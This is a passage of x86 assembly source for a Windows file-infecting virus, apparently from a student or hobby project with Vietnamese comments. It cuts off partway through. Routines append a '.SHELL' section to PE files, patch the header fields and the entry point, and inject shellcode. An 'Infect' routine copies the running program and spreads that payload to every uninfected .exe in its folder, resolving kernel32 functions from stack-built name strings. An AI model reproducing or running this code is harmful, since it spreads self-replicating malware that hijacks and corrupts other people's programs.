    mul edx ; eax = eax*edx => eax = 0x28 * numofsection
    add ebx, eax
    add ebx, 0x8

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x14]; pointer to virtual size
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack


            ; offsetNT + 0x50
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0x50

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov eax, [ebp-0x10]; virtual address
    mov ebx, [ebp-0x14]; virtual size

    add eax, ebx ; sizeofimage = virtual address + virtual size

    push eax
    lea ebx, [esp] ; pointer to sizeofimage

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; end add size of image

        ; *** start increase number of section
            ; offsetNT + 0x06
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0x06

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov edx, [ebp-0xc] ; number of section
    add edx, 1
    push edx
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; end increase number of section


    ; *** start change entrypoint

        ; read virtual address of new section
            ; offsetNT + 0x78 + numberofsection*0x28 + 0xc
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0xc

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    ; write new entrypoint
    lea ebx, [ebp - 0x10] ; pointer to virtual address

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

        ; write virtual address of new section to entrypoint
            ; offsetNT + 0x28
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0x28

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    ; SAVE OLD ENTRYPOINT
    ; lea ebx, [ebp-0x18] ; save old entrypoint

    ; mov ecx, [ebp-0x4]; file handle
    ; push 0;
    ; push 0;
    ; push 0x4
    ; push ebx
    ; push ecx
    ; call ReadFile
    ; add esp,0x14; free stack

    ; WRITE NEW ENTRYPOINT
    lea ebx, [ebp-0x10] ; pointer to virtual address of new section

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
    ; ;;; end change entry point


    ; *** start write shellcode
        ; read pointer to raw data of new section
            ; offsetNT + 0x78 + numberofsection*0x28 + 0x14
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0x14

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack


    lea ebx, [ebp - 0x10] ; pointer to raw data

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

        ; write shellcode
            ; Create file
    mov eax, [ebp+0x10] ; file shellcode

    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x3 ; OPEN_EXISTING -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0xC0000000; GENERIC_READ | GENERIC_WRITE -> dwDesiredAccess
    push eax
    call CreateFileA
    add esp, 0x1c

    push eax ; file handle

    push 0
    push eax
    call GetFileSize
    add esp, 0x8

    push eax ; size file

    push 0x40; PAGE_EXECUTE_READWRITE
    push 0x1000 ; MEM_COMMIT
    push eax ; size file
    push 0 ;
    call VirtualAlloc
    add esp, 0x10
    mov [ebp-0x14], eax


    pop ebx; size
    pop ecx; file handle shellcode

    push ebx ;restore size

    push 0
    push 0
    push ebx
    push eax ; alloc address
    push ecx
    call ReadFile
    add esp, 0x14

    mov ebx, [ebp-0x10] ; pointer to Raw data
    mov ecx, [ebp -0x4] ; file handle

    push 0 ; FILE_BEGIN
    push 0
    push ebx
    push ecx
    call SetFilePointer
    add esp, 0x10

    pop ebx ; size
    mov ecx, [ebp-0x14] ; alloc address save shellcode
    mov edx, [ebp-0x4] ; file handle

    push 0
    push 0
    push ebx
    push ecx
    push edx
    call WriteFile
    add esp, 0x14

    mov edx, [ebp-0x4] ; file handle
    push edx
    call CloseHandle
    add esp, 0x4
    ;; end write shellcode

    ; ** close handle
    ;mov ebx, [ebp-0x4]
    ;push ebx
    ;call CloseHandle
    ;add esp, 0x4

    add esp, 0x34; free stack
    mov eax, [ebp-0x18] ; return old entrypoint
    pop ebp
    ret

ReadLastSection: ; file, path file to output
    push ebp
    mov ebp, esp

    sub esp, 0x18 ; file name: 0x4 -> File Handle
                        ; 0x8 ->  offset NT header, 0xc
                        ; 0xc -> number of section
                        ; 0x10 -> size raw data
                        ; 0x14 -> pointer to raw data
                        ; 0x18 -> alloc addr

    ; *** get file handle
    mov ebx, [ebp+0x8]
    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x3 ; OPEN_EXISTING -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0xC0000000; GENERIC_READ | GENERIC_WRITE -> dwDesiredAccess
    push ebx ; lpFileName
    call CreateFileA
    add esp,0x1c; free stack

    mov [ebp-0x4], eax ; File handle
    mov ecx, [ebp-0x4]  ;  File handle

    ; ** get NT offset
    push 0
    push 0
    push 0x3c
    push ecx ;
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0x8], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea ebx, [ebp-0x8] ; pointer to offset NT header
    mov ecx, [ebp-0x4]  ;  File handle

    push 0
    push 0
    push 0x2
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; end get NT Header Offset

    ; *** start read number of section
    mov ebx, [ebp - 0x8]
    add ebx, 0x06
    mov ecx, [ebp-0x4]

    push 0 ; -> dwMoveMethod
    push 0 ; -> lpDistanceToMoveHigh
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0xc], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea edx, [ebp-0xc] ; pointer to number of section
    mov ecx, [ebp-0x4] ; file handle
    push 0
    push 0
    push 0x2
    push edx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; End Read number of section

    ; get SIZE raw data of last section
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * numofsection
    add ebx, eax
    add ebx, 0x10

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x10]; create a pointer to raw size
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; end get size raw data

    ; *** get pointer to last raw data

    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * numofsection
    add ebx, eax
    add ebx, 0x14

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x14]; create a pointer to raw data
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; End get pointer to raw data



    ; *** start read section data
    mov eax, [ebp-0x10] ; size raw data

    push 0x40; PAGE_EXECUTE_READWRITE
    push 0x1000 ; MEM_COMMIT
    push eax ; size file
    push 0 ;
    call VirtualAlloc
    add esp, 0x10
    mov [ebp-0x18], eax ; alloc address

    mov ebx, [ebp-0x14] ; pointer to last raw data
    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov ebx, [ebp - 0x18]; alloc addres
    mov ecx, [ebp-0x4]; file handle
    mov edx, [ebp-0x10] ; size raw data

    push 0
    push 0
    push edx
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; end read section

    ; create file save data section
    mov eax, [ebp+0xc] ; Path to output

    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x2 ; CREATE_ALWAYS -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0xC0000000; GENERIC_READ | GENERIC_WRITE -> dwDesiredAccess
    push eax ; lpFileName
    call CreateFileA
    add esp,0x1c; free stack
    push eax

    mov ebx, eax ; tempfilevirus
    mov ecx, [ebp-0x10] ; size raw data
    mov edx, [ebp-0x18] ; alloc addr

    push 0;
    push 0
    push ecx
    push edx
    push ebx
    call WriteFile
    add esp, 0x14; free stack
    ; ;;; end write file

    ; ** close handle
    pop ebx
    push ebx
    call CloseHandle ; close handle tempfilevirus
    add esp, 0x4

    mov ebx, [ebp-0x04] ; file handle
    push ebx
    call CloseHandle
    add esp, 0x4

    ;;; end close handle
    add esp, 0x18; free stack
    pop ebp
    ret

align_address:
     push ebp
     mov ebp, esp

     mov eax, [ebp+0x8]; size
     mov ebx, [ebp+0xc]; align
     xor edx, edx
     div ebx ; edx = eax%ebx = size%align, eax = size/align
     cmp edx, 0
     jne .khong_chia_het

     ; chia het
     mov ecx, [ebp+0x10] ; addr
     mov eax, [ebp+0x8]; size
     add eax, ecx

     pop ebp
     ret

     .khong_chia_het:
        add eax, 1 ; size/align + 1
        mov edx, [ebp+0xc]; align
        mul edx ; eax = edx*eax = (size/align + 1)*align

        mov ecx, [ebp+0x10] ; addr
        add eax, ecx ; addr + (size / align + 1) * align;

        pop ebp
        ret


GetModuleFileNameA: ; hModule, lpFilename, nSize
    push ebp
    mov ebp, esp 

    push 0          ; GetModuleFileNameA
    push 0x4165
    push 0x6d614e65
    push 0x6c694665
    push 0x6c75646f
    push 0x4d746547
    mov eax, esp 

    push 0x13 ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; clear args
    add esp, 0x18 ; clear GetModuleFileNameA string

    mov ebx, [ebp+0x8] ; arg1
    mov ecx, [ebp+0xc] ; arg2
    mov edx, [ebp+0x10] ; arg3

    push edx
    push ecx 
    push ebx 
    call eax

    pop ebp
    ret

CopyFileA:   ; lpExistingFileName, lpNewFileName, bFailIfExits
    push ebp
    mov ebp, esp

    push 0          ; CopyFileA
    push 0x41
    push 0x656c6946
    push 0x79706f43
    mov eax, esp 

    push 0xa ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x10

    mov ebx, [ebp+0x8] ; arg1
    mov ecx, [ebp+0xc] ; arg2
    mov edx, [ebp+0x10]; arg3

    push edx
    push ecx 
    push ebx 
    call eax

    pop ebp
    ret 

Infect: ; return old section
    push ebp
    mov ebp, esp

    sub esp, 0x20 ; get 4 reg for local variable

    ; ***** COPY CURRENT FILE
    ; >1. alloc space for save file path
    push 0x40; PAGE_EXECUTE_READWRITE
    push 0x1000 ; MEM_COMMIT
    push 256 ; max len
    push 0 ;
    call VirtualAlloc
    mov [ebp-0x4], eax
    add esp, 0x10; free args

    ; >2. Get current file path
    push 256; max len
    push eax
    push 0
    call GetModuleFileNameA
    add esp, 0xc; free args

    mov eax, [ebp-0x4]
    push eax
    call GetLenStr
    add esp, 0x4

    mov ebx, [ebp-0x4] ; fullpath current file name

    push eax ; len
    push ebx ; fullpath
    call GetFileName ; get filename from path
    add esp, 0x8
    mov [ebp-0x4], eax


    ; >3. Repair temp file
    push 0x40; PAGE_EXECUTE_READWRITE
    push 0x1000 ; MEM_COMMIT
    push 0x10 ; max len
    push 0 ;
    call VirtualAlloc
    mov [ebp-0x8], eax
    add esp, 0x10; free args

    push 0          ; tempfile.exe
    push 0x6578652e
    push 0x656c6966
    push 0x706d6574
    mov [ebp-0x8], esp

    push 0          ; section.raw
    push 0x776172
    push 0x2e6e6f69
    push 0x74636573
    mov [ebp-0xc], esp

    push 0          ; .SHELL
    push 0x4c4c
    push 0x4548532e
    mov [ebp-0x20], esp ; section name

    ; >4. Copy to tempFile
    mov ebx, [ebp-0x4] ; current filename
    mov ecx, [ebp-0x8] ; des copy file
    push 1
    push ecx
    push ebx 
    call CopyFileA
    add esp, 0xc ; free 3 args

    ; *** END COPY CURRENT FILE

    ; *** START READ LAST SECTION
    ; read last section from tempfile.exe to section.raw
    mov ebx, [ebp-0x8] ; tempfile.exe
    mov ecx, [ebp-0xc] ; section.raw

    push ecx 
    push ebx 
    call ReadLastSection
    add esp, 0x8 ; free args

    ; *** END READ LAST SECTION

    ; *** START LOAD AND INFECT FILES IN CURRENT
    ; >1. Prepare space for WIN32_FIND_DATAA    
    push 0x40; PAGE_EXECUTE_READWRITE
    push 0x1000 ; MEM_COMMIT
    push 0x140; max len
    push 0 ;
    call VirtualAlloc
    mov [ebp-0x10], eax ; *** WIN32_FIND_DATAA

    add esp, 0x10 ; free args

    ; *** 
    ; >2. FindFirsFileA
    ; load all file exe
    push 0          ; ./*.exe
    push 0x657865
    push 0x2e2a5c2e
    mov eax, esp

    mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA

    push ebx
    push eax
    call FindFirstFileA
    mov [ebp-0x14], eax ; ***** hFind

    add esp, 0x8  ; free agrs
    add esp, 0xc ; free ./*.exe string

    .loop_load_file:

        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
        add ebx, 0x2c ; file path from current folder

        ; if the file is tempfile.exe -> go to next file
        ; if the file have already .SHELL -> go to next file
        cld  ; set DF=0 => process string from left to right 
        mov esi, [ebp-0x08] ; tempfile.exe
        mov edi, ebx ; file from current folder
        mov ecx, 0xd ; len of tempfile.exe string
        repe cmpsb
        jz .load_next_file ; if ZF=1 => 2 strings are equal


        ; avoid to add section itself
        mov eax, [ebp-0x4] ; name of program
        push eax
        call GetLenStr
        add esp, 0x4 ; free arg

        mov ecx, [ebp-0x4] ; name of program

        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
        add ebx, 0x2c ; file path from current folder

        push eax ; len
        push ebx ; filename from folder
        push ecx ; name if program
        call CmpStr
        add esp, 0xc

        cmp eax, 0
        je .load_next_file


        ; mov edx, esp
        ; mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
        ; add ebx, 0x2c ; file path from current folder

        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
        add ebx, 0x2c ; file path from current folder

        mov edx, [ebp-0x20]
        
        push edx ; section name
        push ebx ; file of current folder
        call FindSection
        add esp, 0x8 ; free 2 args

        cmp eax, 0xffffffff ; -1 -> neu khong tim thay section chi dinh 
        jne .load_next_file ; => chua bi lay nhiem -> thuc hien lay nhiem
        ; end check file


        mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA
        add ebx, 0x2c ; file path from current folder

        mov edx, [ebp-0x20] ; section name
        mov ecx, [ebp-0xc] ; path file save section shellcode content
        
        push ecx ; file point section shellcode
        push edx ; section name
        push ebx ; des file from current folder
        call AddSection

        add esp, 0xc ; free agrs
        
        .load_next_file:

            mov eax, [ebp-0x14] ; hFile
            mov ebx, [ebp-0x10] ; WIN32_FIND_DATAA

            push ebx 
            push eax
            call FindNextFileA

            add esp, 0x8 ; free args

            cmp eax, 0          ; still have other file
            jne .loop_load_file


    add esp, 0x10 ; free section.raw string
    add esp, 0x10 ; free tempfile.exe
    add esp, 0xc ; free .SHELL string
    add esp, 0x20 ; free local variable

    pop ebp
    ret

GetFileName: ; full path, len -> return pointer to file name
    push ebp
    mov ebp, esp 

    mov edx, [ebp+0x8] ; full path
    mov esi, [ebp+0xc] ; len

    xor ebx, ebx

    mov ecx, esi
    dec ecx
    .loop:
        mov al, [edx+ecx]
        mov bl, 0x5c ; '\'

        cmp al, bl
        je .found

        dec ecx
        cmp ecx,0
        jle .found ; -> the path have only filename

        jmp .loop

    .found:
        inc ecx
        lea eax, [edx + ecx]
        pop ebp
        ret



FindFirstFileA: ; lpFileName, lpFindFileData
    push ebp
    mov ebp, esp

    push 0          ; FindFirstFileA
    push 0x4165
    push 0x6c694674
    push 0x73726946
    push 0x646e6946
    mov eax, esp

    push 0xf
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free 2 args
    add esp, 0x14 ; free FindFirstFileA string

    mov ebx, [ebp+0x8] ; arg1
    mov ecx, [ebp+0xc] ; arg2

    push ecx 
    push ebx 
    call eax

    pop ebp
    ret

FindNextFileA: ; hFindFile, lpFindFileData
    push ebp
    mov ebp, esp 

    push 0          ; FindNextFileA
    push 0x41
    push 0x656c6946
    push 0x7478654e
    push 0x646e6946
    mov eax, esp 

    push 0xe; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free 2 agrs
    add esp, 0x14 ; free FindNextFileA string

    mov ebx, [ebp+0x8] ; arg1
    mov ecx, [ebp+0xc] ; arg2

    push ecx 
    push ebx 
    call eax

    pop ebp
    ret

CopyMemory:
    push ebp
    mov ebp, esp 

